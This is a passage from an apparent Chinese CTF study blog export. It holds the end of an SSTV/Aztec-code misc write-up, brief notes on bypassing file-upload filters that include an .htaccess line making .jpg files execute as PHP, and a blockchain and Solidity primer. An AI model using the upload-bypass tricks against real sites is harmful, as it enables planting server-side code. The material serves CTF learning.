     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)

except FileNotFoundError:
    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
except Exception as e:
    print(f&quot;错误：&#123;str(e)&#125;&quot;)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
]]></content>
      <tags>
        <tag>-CTF -Write up</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
<p>弱判断:bp改一下就能过</p>
<p>增加文件头</p>
<p>改phtml绕过</p>
<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>CTF Web</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约深度学习（持续施工ing）</title>
    <url>/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<h1 id="智能合约深度学习"><a href="#智能合约深度学习" class="headerlink" title="智能合约深度学习"></a>智能合约深度学习</h1></blockquote>
<h1 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h1><blockquote>
<p><strong>如果想直接入手合约，可以直接跳至合约开发模块哦</strong></p>
</blockquote>
<p>在进入智能合约学习环节之前，让我们先了解一下它的“爹”，即<strong>区块链</strong></p>
<p>区块链，是一种区中心化，点对点系统的工具，也可以说是一种数据库系统（实际上就是一本记录各种交易的账本）</p>
<p>区别于传统的中心化系统，这个系统由各个区块（前区块的加密哈希，时间戳，交易数据）组成，在这个系统中，由网络中的大多数节点来决定新区块中交易记录的录入以及修改。这就使得其安全性远远超过了传统的系统。假设一个用户想要伪造一份交易，那么从理论来说他需要修改全网每个节点的总账，这个过程需要消耗巨量的算力<del>有这算力谁还来伪造交易啊</del>，每增加一个区块，需要全网51%以上的节点的认可才能够组成区块链</p>
<p>那么我们现在更具体一点，来谈一个家喻户晓的区块链系统———比特币系统</p>
<h1 id="关于比特币系统"><a href="#关于比特币系统" class="headerlink" title="关于比特币系统"></a>关于比特币系统</h1><h2 id="竞争记账"><a href="#竞争记账" class="headerlink" title="竞争记账"></a>竞争记账</h2><p>即挖矿，在一个区块建立之后，竞争记账的节点需要计算建立以来所有交易的哈希值（<strong>SHA256</strong>），再将其两两组合，不断重复，最终得到一个SHA256值（也叫<strong>默克根</strong>），最后需要进行以下计算</p>
<pre><code class="highlight plaintext">SHA256(默克根+前一区的ID+一个随机数)</code></pre>

<p>通常这个值要满足哈希值的前20位为0(达成概率在百万分之一水平),也就是算力比拼</p>
<p>成功者向全网发送通知，若经过检验大家就公认他构造的这个区块并以其作为父区块，进行下一个区块的算力竞争（每10分钟进行一次）</p>
<p>成功者会获得12.5个比特币<del>122w美刀(2024.12.9日汇率)</del>作为奖励，这就是中本聪设计的激励机制<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e23cc007503b1060aa2f3f307de43b14.png" alt="img"></p>
<h2 id="长链与短链"><a href="#长链与短链" class="headerlink" title="长链与短链"></a>长链与短链</h2><p>又是算力竞争……在向全网通知时（假设你的答案正确），可能会有人与你在相同的时间发送了正确的答案，于是会出现两条链，那么就又到了拼算力的时候了，不同的矿工会选择不同的链继续下一轮区块计算，这里就不得不提另一种机制了，即<strong>总是选择工作量最大的链</strong>，于是哪条链先出现下一个区块，也就意味着会有更多的矿工选择这条链工作，那么另一条短链就会被废止。组装短链的矿工也得不到比特币奖励，结果就是区块链只有唯一一条主线。</p>
<h2 id="比特币的交易"><a href="#比特币的交易" class="headerlink" title="比特币的交易"></a>比特币的交易</h2><p>交易包括两个方向，Input以及Output.</p>
<p>两者可以不完全一致，但只能输入略大于输出，那么缺少的这部分去哪里了呢 ，是支付给了矿工哦，每笔交易在发布后可以选择支付交易费用，钱到位交易也会更快被打包。但是不代表不支付或支付很少交易费用不会有人处理你的交易，只是会被推迟，总之，不管是否支付交易费用，矿工都会获得比特币的奖励，你可以将其理解为：<strong>即使你不付给服务员小费，但并不影响他获得工资</strong>。</p>
<h2 id="比特币的交易加密"><a href="#比特币的交易加密" class="headerlink" title="比特币的交易加密"></a>比特币的交易加密</h2><p>对于每个用户的钱包，都由三部分组成</p>
<p><strong>16位的地址，公钥，私钥(256位)</strong></p>
<p>假设在A与B交易，A发送给B一条A的私钥加密过的内容，那么若B没有A的公钥，B就无法解密内容</p>
<p>公钥的产生依赖于私钥，而钱包的地址生成依赖于公钥</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/65e01b2554c3850eeeebb60eb7c4b93b.jpeg" alt="img"></p>
<p>贴一条其他师傅的说明过程。</p>
<p>第一步：生成随机私钥</p>
<p>私钥是一个随机数，随机选取一个32字节的数，这个数的范围大小是介于1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141之间的一个数，为了方便后面的计算，我们随机生成一个合法的私钥：</p>
<p>8F72F6B29E6E225A36B68DFE333C7CE5E55D83249D3D2CD6332671FA445C4DD3</p>
<p>第二步：椭圆曲线算公钥</p>
<p>生成了私钥之后，我们使用椭圆曲线加密算法（ECDSA-secp256k1）计算私钥所对应的非压缩公钥，生成的公钥共65字节， 其中一个字节是0x04，其中32个字节是X坐标，另外32个字节是Y坐标：</p>
<p>公钥P.X：<br>06CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385</p>
<p>公钥P.Y：<br>FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>第三步：计算公钥的SHA-256哈希值</p>
<p>将上述公钥地址拼合，得到标准地址：<br>0406CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>对齐进行SHA-256哈希计算，得到结果：<br>2572e5f4a8e77ddf5bb35b9e61c61f66455a4a24bcfd6cb190a8e8ff48fc097d</p>
<p>第四步：计算 RIPEMD-160哈希值</p>
<p>取上一步结果，进行RIPEMD-160计算，得到结果：</p>
<p>0b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第五步：加入地址版本号（比特币主网版本号“0x00”）</p>
<p>取上一步结果，在前面加上16进制的00，即：</p>
<p>000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第六步：计算 SHA-256 哈希值</p>
<p>取上一步结果，进行SHA-256计算，可得：</p>
<p>ddc2270f93cc84cc6869dd373f3c340bbf5cb9a8f5559297cc9e5d947aab2536</p>
<p>然后，对以上结果再次计算 SHA-256 哈希值，得到：</p>
<p>869ac57b83ccf75ca9da8895823562fffb611e3c297d9c2d4612aeeb32850078</p>
<p>第七步：取上一步结果的前4个字节（8位十六进制）</p>
<p>869ac57b</p>
<p>第八步：把这4个字节加在第五步的结果后面</p>
<p>作为校验位，将这4个字节加载第五步的结果后面，这就是比特币地址的16进制形态了：</p>
<p>869ac57b000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第九步：用Base58编码变换一下地址</p>
<p>对上一步的结果进行Base58编码，得到：</p>
<p>1QCXRuoxWo5Bya9NxHaVBArBQYhatHJrU7</p>
<p>这就是我们经常看到的传统意义上的比特币钱包地址</p>
<h1 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h1><p>智能合约的开发，主要使用Solidity编译语言以及在线的Remix编译器</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>有符号整数类型包括int8、int16、int32、int64等，而无符号整数类型包括uint8、uint16、uint32、uint64等。这些类型表示不同位数的整数。</p>
<p>相较于C语言，保留了大部分运算，增加了乘方(**)运算以及更改了”&lt;&lt;””&gt;&gt;”的运算规则</p>
<pre><code class="highlight plaintext">x&lt;&lt;y  相当于x*2**y   x&gt;&gt;y相当于x/2**y</code></pre>



<h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>即bool类型，会在内置函数中大量出现，默认值为false</p>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>用<strong>address</strong>来声明，长度为20位，表示以太坊网络上的账户地址</p>
<p>在地址型下有**transfer(转账)<strong>与</strong>balance(账户)**两个变量</p>
<p>通过以下函数来处理地址类型（关于Gas的概念，请见<strong>交易处理</strong>板块）</p>
<pre><code class="highlight plaintext">&lt;address&gt;.balance(uint 256) ——&gt;返回以wei为单位的该地址的以太币账户（1ETH=10^18wei）</code></pre>

<pre><code class="highlight plaintext">&lt;address&gt;.transfer(uint 256 amount) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）</code></pre>

<p>余额不足，Gas不足时会使合约无法执行，回滚已执行的程序并且发送异常信息（<strong>交易被终止</strong>）</p>
<pre><code class="highlight plaintext">&lt;address&gt;.send(uint 256 amount) returns (bool) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）在交易成功或失败后会返回对应的bool值</code></pre>

<p>余额不足，Gas不足时会终止程序但不会发送异常消息，会返回False</p>
<p>但使用.send是存在一定风险的，可能会导致转账失败(调用的堆栈&gt;1024KB或发出方的Gas耗尽)的情况下交易的对方仍能收到以太币</p>
<pre><code class="highlight plaintext">&lt;address&gt;.call(...) returns (bool) ——&gt;最常用的调用函数，失败返回false,Gas的费用可自己调整。</code></pre>

<p>发布低级别的调用</p>
<p>call()下有两个控制交易的内置函数</p>
<p>gas()(支付的Gas值)与value()(支付的以太币值)，两者同时调用没有先后顺序的要求</p>
<pre><code class="highlight plaintext">例如：address.call.gas(100000).value(1 ether)(&quot;register&quot;,&quot;Myname&quot;)</code></pre>



<pre><code class="highlight plaintext">&lt;address&gt;.callcode(...) returns (bool)</code></pre>

<p>发布低级别的调用，没call好用，不久就会被删除了</p>
<pre><code class="highlight plaintext">&lt;address&gt; .delegatecall(...) returns (bool)</code></pre>

<p>发布低级别的代表调用,调用的是储存在另一个库中的库代码(Library code)</p>
<p>？故使用前要确定两个合约的储存设计都要适用于该函数？</p>
<blockquote>
<p>[!WARNING]</p>
<p><code>call()</code> <code>callcode()</code> <code>delegatecall()</code>都是低阶函数，使用时调用的未知合约可能是恶意合约，在调用是可能会被篡权，反过来被调用合约，因此调用函数返回时要注意原合约的参数是否已经被改变</p>
</blockquote>
<blockquote>
<p>地址常量</p>
</blockquote>
<p>​	</p>
<h3 id="字节数组"><a href="#字节数组" class="headerlink" title="字节数组"></a>字节数组</h3><p>分为<strong>固定长度的字节数组</strong>以及<strong>可变长度的字节数组</strong></p>
<p>固定长度的数组可以用bytes1~bytes32来说明(bytes1也可以直接记作byte)</p>
<p>可以通过索引访问以及[变量名].length返回字节长度</p>
<p>可变长度的数组：</p>
<p>①bytes(与array性质相同)</p>
<p>②string(可以理解为特殊的数组)，不可以调用.length&#x2F;索引来访问</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>智能合约</tag>
      </tags>
  </entry>
</search>
